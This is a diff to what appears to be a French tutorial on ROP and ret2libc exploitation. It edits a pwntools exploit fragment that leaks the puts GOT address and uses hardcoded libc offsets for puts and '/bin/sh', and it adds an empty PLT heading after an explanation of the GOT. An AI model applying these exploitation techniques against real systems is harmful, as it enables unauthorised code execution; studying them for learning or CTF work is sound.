@@ -33,7 +33,7 @@ pld += p64(addr_main) # ret2main
 p.sendline(pld) # send payload
 
 puts_leak = u64(p.recvline().strip().ljust(8, b'\x00')) # to get valid address
-log.info('Addr puts leak : {}'.format(hex(puts_leak))) # print address puts leaked
+log.info('Addr puts (GOT) leak : {}'.format(hex(puts_leak))) # print address puts leaked
 
 libc_puts = 0x06f690
 libc_binsh = 0x18cd17
@@ -71,3 +71,7 @@ Pour le ROP nous allons nous intéréssé particulièrement à ces sections :
 ### Global Offset Table (GOT)
 
 La GOT (Global Offset Table) est une section qui effectue une résolution d'adresse de la libc pour un gain de temps au processeur. C'est un tableau de pointeurs qui stocke les vrais adresses des fonctions de la libc.
+
+### Procedure Linkage Table (PLT)
+
+
